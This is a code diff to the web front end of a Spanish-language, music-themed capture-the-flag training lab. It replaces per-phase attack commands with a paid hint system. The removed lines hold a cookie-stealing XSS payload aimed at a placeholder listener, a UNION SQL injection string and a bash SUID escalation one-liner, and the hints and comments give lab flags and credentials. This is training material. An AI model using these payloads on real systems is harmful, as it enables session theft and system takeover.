@@ -1319,29 +1319,32 @@
 
           <!-- Terminal Content Body -->
           <div class="terminal-content-body">
-            <!-- Metadata Grid -->
+            <!-- Metadata Grid (Black-Box: Unsolved phases are masked) -->
             <div class="target-specs-grid">
               <div class="spec-card">
                 <span class="spec-label">VÍCTIMA / HOST</span>
-                <span class="spec-value accent-cyan" id="crt-target-ip">192.168.56.1 (Puerto 80)</span>
+                <span class="spec-value accent-cyan" id="crt-target-ip">[ESCANEAR 192.168.56.0/24]</span>
               </div>
               <div class="spec-card">
                 <span class="spec-label">ESTÁNDAR MITRE / CWE</span>
-                <span class="spec-value accent-yellow" id="crt-cwe">CWE-311 (ROT13)</span>
+                <span class="spec-value accent-yellow" id="crt-cwe">[CLASIFICADO / PENDIENTE]</span>
               </div>
               <div class="spec-card full-width">
-                <span class="spec-label">VECTOR DE EXPLOTACIÓN</span>
-                <span class="spec-value" id="crt-vector">PCAP Deep Packet Inspection / User-Agent</span>
+                <span class="spec-label">VECTOR DE AUDITORÍA</span>
+                <span class="spec-value" id="crt-vector">[REQUIERE RECONOCIMIENTO ACTIVO]</span>
               </div>
             </div>
 
-            <!-- Kali Linux Code Console with Copy Button -->
-            <div class="terminal-command-wrap">
+            <!-- Tactical Clue Box (Hidden by default, unlocks for -25 PTS) -->
+            <div class="terminal-command-wrap" id="hint-panel-box">
               <div class="cmd-header-row">
-                <span class="cmd-user-prompt">kali<span class="at">@</span>ctf-box<span class="path">:~$</span></span>
-                <button class="btn-copy-cmd" onclick="copyKaliCommand()" id="btn-copy-cmd">📋 COPIAR</button>
+                <span class="cmd-user-prompt">metodología<span class="at">@</span>auditoría<span class="path">:~$</span></span>
+                <span id="hint-status-badge" style="font-family:'Fira Code',monospace; font-size:9px; color:var(--text-muted);">PISTA BLOQUEADA</span>
               </div>
-              <div class="cmd-code-line" id="crt-command">tshark -r jimi_hendrix.pcap -Y "http.request" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'</div>
+              <div id="hint-unlocked-text" style="display:none; font-family:'Fira Code',monospace; font-size:11px; color:#facc15; line-height:1.4;"></div>
+              <button class="btn-copy-cmd" id="btn-unlock-hint" onclick="requestTacticalHint()" style="background:rgba(234,179,8,0.15); border-color:#eab308; color:#fef08a; padding:6px 12px; font-weight:700; align-self:flex-start;">
+                💡 DESBLOQUEAR PISTA METODOLÓGICA (-25 PTS)
+              </button>
             </div>
 
             <!-- Flag Submission Console -->
@@ -1464,55 +1467,80 @@
 
     // Milestones Data
     const MILESTONES = {
+      0: {
+        fret: 3, name: "Reconocimiento de Red", phase: 0, points: 100,
+        title: "Fase 0: Detección de Host y Servicios (Nmap)",
+        trackTitle: "Acoustic Intro / Tuning",
+        audio: "assets/audio/hendrix.m4a",
+        vectorReal: "Barrido de Red & Enumeración de Cabeceras",
+        cweReal: "Descubrimiento de Red / CWE-200",
+        targetReal: "192.168.56.0/24 (Puerto 80 / 2222 / 1337)",
+        tacticalHint: "Ejecuta un escaneo de host con 'nmap -sn 192.168.56.0/24'. Luego inspecciona los banners y cabeceras de respuesta HTTP del puerto 80 con 'nmap -sV -sC' o 'curl -I http://IP/'."
+      },
       1: {
         fret: 6, name: "Jimi Hendrix", phase: 1, points: 150,
         title: "Fase 1: Jimi Hendrix Experience",
         trackTitle: "Purple Haze",
         audio: "assets/audio/hendrix.m4a",
-        vector: "PCAP DPI / User-Agent Header", cwe: "ROT13 / CWE-311",
-        target: "192.168.56.1 (Puerto 80 HTTP)",
-        kaliGuide: "tshark -r jimi_hendrix.pcap -Y \"http.request\" -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
+        vectorReal: "PCAP Deep Packet Inspection / C&C Beacon",
+        cweReal: "Tráfico sin Cifrado Fuerte / CWE-311 (ROT13)",
+        targetReal: "192.168.56.1 (Puerto 80 HTTP)",
+        tacticalHint: "Se detectó tráfico de red anómalo. Captura paquetes con 'tshark' o 'tcpdump' en la interfaz de red local. Filtra las peticiones HTTP y analiza cabeceras User-Agent inusuales con cifrado de sustitución básica."
       },
       2: {
-        fret: 11, name: "Janis Joplin", phase: 2, points: 200,
+        fret: 11, name: "Janis Joplin", phase: 2, points: 150,
         title: "Fase 2: Janis Joplin Caravan",
         trackTitle: "Cry Baby",
         audio: "assets/audio/joplin.m4a",
-        vector: "Esteganografía Web EOF", cwe: "Información Sensible / CWE-200",
-        target: "http://192.168.56.1/cry_baby/janis.jpg",
-        kaliGuide: "strings janis.jpg | grep -i \"FLAG\" || binwalk -e janis.jpg"
+        vectorReal: "Esteganografía Web EOF (End of File)",
+        cweReal: "Fuga de Información en Ficheros / CWE-200",
+        targetReal: "http://192.168.56.1/cry_baby/janis.jpg",
+        tacticalHint: "Descarga las imágenes del aplicativo web y usa herramientas de análisis binario como 'strings' o 'binwalk'. ¡Cuidado con directorios sospechosos como /admin_trampa/ que contienen señuelos engañosos!"
       },
       3: {
-        fret: 16, name: "Jim Morrison", phase: 3, points: 250,
+        fret: 16, name: "Jim Morrison", phase: 3, points: 200,
         title: "Fase 3: The Doors Crypt / Vault",
         trackTitle: "Light My Fire",
         audio: "assets/audio/morrison.m4a",
-        vector: "SQL Injection UNION Based", cwe: "Inyección SQL / CWE-89",
-        target: "http://192.168.56.1/doors/?id=1",
-        kaliGuide: "' UNION SELECT 1,group_concat(flag),3 FROM flag_vault-- -"
+        vectorReal: "SQL Injection UNION Based",
+        cweReal: "Inyección SQL Clásica / CWE-89",
+        targetReal: "http://192.168.56.1/doors/?id=1",
+        tacticalHint: "Evalúa los parámetros GET de la página con caracteres especiales (') para provocar un error de sintaxis en la base de datos. Determina el número de columnas con 'ORDER BY' e inyecta 'UNION SELECT' en la tabla de bóveda genuina (doors_vault)."
       },
       4: {
         fret: 21, name: "Amy Winehouse", phase: 4, points: 200,
         title: "Fase 4: Camden Speakeasy & Jazz Club",
         trackTitle: "Back To Black",
         audio: "assets/audio/winehouse.m4a",
-        vector: "Stored Cross-Site Scripting (XSS)", cwe: "Secuestro de Sesión / CWE-79",
-        target: "http://192.168.56.1/winehouse/",
-        kaliGuide: "<scr" + "ipt>fetch('http://TU_IP:8000/?c='+document.cookie)</scr" + "ipt>"
+        vectorReal: "Stored Cross-Site Scripting (XSS)",
+        cweReal: "Secuestro de Sesión de Usuario / CWE-79",
+        targetReal: "http://192.168.56.1/winehouse/",
+        tacticalHint: "El libro de visitas almacena entradas sin sanitización HTML. Inyecta un script malicioso en JavaScript que envíe 'document.cookie' a un listener abierto en tu Kali con 'nc -lvnp 8000'. Cuidado con cookies trampa de utilería."
       },
       5: {
         fret: 27, name: "Kurt Cobain", phase: 5, points: 200, isRoot: true,
         title: "Fase 5: Seattle Grunge Garage (Root)",
         trackTitle: "Smells Like Teen Spirit",
         audio: "assets/audio/cobain.m4a",
-        vector: "SUID / GTFOBins Escalation", cwe: "Privilegios Indebidos / CWE-250",
-        target: "SSH kurt@192.168.56.1:22 (grunge27)",
-        kaliGuide: "sudo find . -exec /bin/bash -p \\; -quit"
+        vectorReal: "SUID Binary Privilege Escalation",
+        cweReal: "Ejecución con Privilegios Indebidos / CWE-250",
+        targetReal: "SSH kurt@192.168.56.1:2222 (Pass: grunge27 / nirvana)",
+        tacticalHint: "Una vez dentro del sistema por SSH, busca ejecutables con bit SUID activo con 'find / -perm -4000 2>/dev/null'. Consulta GTFOBins para aprovechar el binario identificado y elevar privilegios a root (uid=0)."
       }
     };
 
     // Client-side Cryptographic Hash Database (Matches provision_27club_phases.sh)
     const CTF_HASH_DB = {
+      // Fase 0: Reconocimiento de Red Nmap (27C{nmap_sc4n_r0ck_h0st_d1sc0v3ry})
+      "86a2773f2ae4ef15ad5b2bec8a6f600c16320edf6d52960a707f8fa7014ab734": {
+        phase: 0, type: "flag", name: "Reconocimiento de Red", points: 100, nextPhase: 1,
+        msg: "¡OBJETIVO LOCALIZADO! Escaneo Nmap completado y cabeceras enumeradas exitosamente."
+      },
+      // SEÑUELO TROLL: Puerto 1337 Backdoor Trap (27C{tr0ll_b4ckd00r_p0rt_1337_lol})
+      "1fa4ecf3ac3f240b4b7c165216037ada0ea3982bdab5384ce2e8844985cedba3": {
+        phase: 0, type: "rabbit_hole", name: "Señuelo Troll Port 1337", penalty: 50,
+        msg: "RABBIT HOLE: Caíste en la trampa del puerto señuelo 1337 inspirado en la máquina Troll."
+      },
       // Fase 1: Jimi Hendrix (27C{purpl3_h4z3_c0nd0r_n3t})
       "0ddd44bc14f853bf20201ce47425db06ddda3f818628a5245c793a3b802cdf99": {
         phase: 1, type: "flag", name: "Jimi Hendrix", points: 150, nextPhase: 2,
@@ -1520,7 +1548,7 @@
       },
       // Fase 2: Janis Joplin (27C{p34rl_cry_b4by_s3cr3t_1970})
       "baffb733b5a0e2f6d1a947a99e1642efbc2b763879e5a42bee825f0bd0719abe": {
-        phase: 2, type: "flag", name: "Janis Joplin", points: 200, nextPhase: 3,
+        phase: 2, type: "flag", name: "Janis Joplin", points: 150, nextPhase: 3,
         msg: "¡ESTEGANOGRAFÍA RESUELTA! Artefacto EOF exfiltrado de la furgoneta."
       },
       // Decoy Janis: Señuelo en admin_trampa (27C{b4ckup_k3ys_v4ult_c4r4v4n})
@@ -1530,7 +1558,7 @@
       },
       // Fase 3: Jim Morrison (27C{l1ght_my_f1r3_c1p4_sqli})
       "5ea96349723508473974c046a80bcf6a126908a16c1e8efa8a2331d3aecb6fcd": {
-        phase: 3, type: "flag", name: "Jim Morrison", points: 250, nextPhase: 4,
+        phase: 3, type: "flag", name: "Jim Morrison", points: 200, nextPhase: 4,
         msg: "¡PUERTA DESBLOQUEADA! Inyección SQL UNION Based completada."
       },
       // Decoy Morrison: Señuelo en doors_trap (27C{th3_3nd_d00rs_m4st3r_v4ult})
@@ -1557,10 +1585,11 @@
 
     // State Variables
     let currentFret = 0;
-    let activePhase = 1;
+    let activePhase = 0;
     let score = 0;
     let capturedFlagsCount = 0;
     const completedPhases = new Set();
+    const unlockedHints = new Set();
     let isSoundMuted = false;
 
     // Web Audio API
@@ -1901,6 +1930,77 @@
       }).catch(err => console.warn("Clipboard error:", err));
     }
 
+
+    // =========================================================================
+    // TACTICAL HINT SYSTEM (COST: -25 PTS) & BLACK-BOX SPECS UPDATER
+    // =========================================================================
+    function requestTacticalHint() {
+      if (unlockedHints.has(activePhase)) {
+        return; // Already unlocked for this phase
+      }
+
+      const m = MILESTONES[activePhase];
+      if (!m) return;
+
+      const confirmUnlock = confirm(`¿Deseas desbloquear la pista metodológica de la ${m.title}?\n\nPenalización académica: -25 PUNTOS en el marcador oficial.`);
+      if (!confirmUnlock) return;
+
+      // Apply penalty and mark unlocked
+      score = Math.max(0, score - 25);
+      unlockedHints.add(activePhase);
+      updateTelemetryUI();
+
+      renderHintUI(activePhase);
+      playBrokenStringSound(); // Subtle warning twang
+      showToast("💡 PISTA DESBLOQUEADA", `Se descontaron 25 PTS. Revisa la consola de auditoría.`);
+    }
+
+    function renderHintUI(phaseNum) {
+      const m = MILESTONES[phaseNum];
+      const hintText = document.getElementById("hint-unlocked-text");
+      const hintBtn = document.getElementById("btn-unlock-hint");
+      const hintBadge = document.getElementById("hint-status-badge");
+      if (!hintText || !hintBtn || !hintBadge || !m) return;
+
+      if (unlockedHints.has(phaseNum)) {
+        hintText.style.display = "block";
+        hintText.innerHTML = `> ${m.tacticalHint}`;
+        hintBtn.style.display = "none";
+        hintBadge.textContent = "PISTA ACTIVA (-25 PTS)";
+        hintBadge.style.color = "#facc15";
+      } else {
+        hintText.style.display = "none";
+        hintBtn.style.display = "inline-block";
+        hintBadge.textContent = "PISTA BLOQUEADA";
+        hintBadge.style.color = "var(--text-muted)";
+      }
+    }
+
+    function updateBlackBoxSpecs(phaseNum) {
+      const m = MILESTONES[phaseNum];
+      if (!m) return;
+
+      const targetEl = document.getElementById("crt-target-ip");
+      const cweEl = document.getElementById("crt-cwe");
+      const vectorEl = document.getElementById("crt-vector");
+
+      if (completedPhases.has(phaseNum)) {
+        // Solved: Reveal Full Forensic Specs
+        targetEl.textContent = m.targetReal;
+        cweEl.textContent = m.cweReal;
+        vectorEl.textContent = `✅ RESUELTO: ${m.vectorReal}`;
+        vectorEl.style.color = "#86efac";
+      } else {
+        // Unsolved: Black-Box Mask
+        targetEl.textContent = phaseNum === 0 ? "192.168.56.0/24 (Escanear)" : "[CLASIFICADO - AUDITAR]";
+        cweEl.textContent = "[NO IDENTIFICADO]";
+        vectorEl.textContent = "[REQUIERE RECONOCIMIENTO ACTIVO]";
+        vectorEl.style.color = "#e2e8f0";
+      }
+
+      renderHintUI(phaseNum);
+    }
+
     // Move Slide to Fret on Diapasón
     function moveSlideToFret(targetFret) {
       const prevFret = currentFret;
@@ -2006,7 +2106,7 @@
           input.value = "";
 
           // 7. CHECK VICTORY CONDITION (ALL 5 FLAGS CAPTURED!)
-          if (completedPhases.size === 5) {
+          if (completedPhases.size === 6) {
             setTimeout(() => {
               triggerVictoryFinale();
             }, 2200);
@@ -2050,7 +2150,7 @@
       `;
 
       container.appendChild(card);
-      document.getElementById("showcase-counter").textContent = `${completedPhases.size} / 5 DESCUBIERTOS`;
+      document.getElementById("showcase-counter").textContent = `${completedPhases.size} / 6 BANDERAS`;
     }
 
     function markDiapasonFrets(fret) {
@@ -2069,7 +2169,7 @@
       document.getElementById("crt-target-ip").textContent = m.target;
       document.getElementById("crt-vector").textContent = m.vector;
       document.getElementById("crt-cwe").textContent = m.cwe;
-      document.getElementById("crt-command").textContent = m.kaliGuide;
+      updateBlackBoxSpecs(phaseNum);
 
       // Update HUD
       document.getElementById("hud-artist").textContent = `${phaseNum}. ${m.name.toUpperCase()}`;
@@ -2082,7 +2182,7 @@
 
     function updateTelemetryUI() {
       document.getElementById("hud-score").textContent = `${score} PTS`;
-      document.getElementById("hud-flags").textContent = `${capturedFlagsCount} / 5`;
+      document.getElementById("hud-flags").textContent = `${capturedFlagsCount} / 6`;
     }
 
     function showToast(title, desc) {
@@ -2110,6 +2210,7 @@
       showToast("🎓 INICIANDO DEMOSTRACIÓN 100%", "Inyectando las 5 banderas del CTF...");
 
       const demoFlags = [
+        "27C{nmap_sc4n_r0ck_h0st_d1sc0v3ry}",
         "27C{purpl3_h4z3_c0nd0r_n3t}",
         "27C{p34rl_cry_b4by_s3cr3t_1970}",
         "27C{l1ght_my_f1r3_c1p4_sqli}",
@@ -2126,13 +2227,14 @@
 
     function resetCTFProgress() {
       currentFret = 0;
-      activePhase = 1;
+      activePhase = 0;
       score = 0;
       capturedFlagsCount = 0;
       completedPhases.clear();
+      unlockedHints.clear();
 
       moveSlideToFret(0);
-      selectPhase(1);
+      selectPhase(0);
       updateTelemetryUI();
 
       const container = document.getElementById("vinyl-cards-container");
@@ -2203,7 +2305,7 @@
       // Initial Slide placement
       setTimeout(() => {
         moveSlideToFret(0);
-        selectPhase(1);
+        selectPhase(0);
       }, 100);
 
       // Sound toggle
